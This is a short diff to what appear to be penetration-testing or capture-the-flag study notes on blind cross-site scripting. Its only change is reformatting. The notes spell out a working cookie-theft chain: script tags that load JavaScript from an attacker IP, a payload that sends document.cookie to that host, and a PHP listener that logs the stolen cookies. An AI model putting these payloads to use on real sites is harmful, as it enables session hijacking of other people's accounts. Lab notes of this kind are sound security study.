@@ -415,8 +415,7 @@ iii. Then observe — we will receive the username and password on the terminal.
 **Step for blind XSS**
 1. Identify the parameter # `"><script src="http://OUR_IP/username"></script>` # username is the parameter name in which we are putting this payload
 2. create a 2 files 1st is script.js with this payload `">new Image().src='http://10.10.14.183/index.php?c='+document.cookie` and 2nd is index.php with following content
-`
-<?php
+`<?php
 if (isset($_GET['c'])) {
     $list = explode(";", $_GET['c']);
     foreach ($list as $key => $value) {
@@ -426,7 +425,7 @@ if (isset($_GET['c'])) {
         fclose($file);
     }
 }
-?>
-`
+?>`
+
 3. use this payload in the vulnerable parameter `'><script src=http://10.10.15.62/script.js></script>` then in the terminal we will receive an cookie of the admin
    
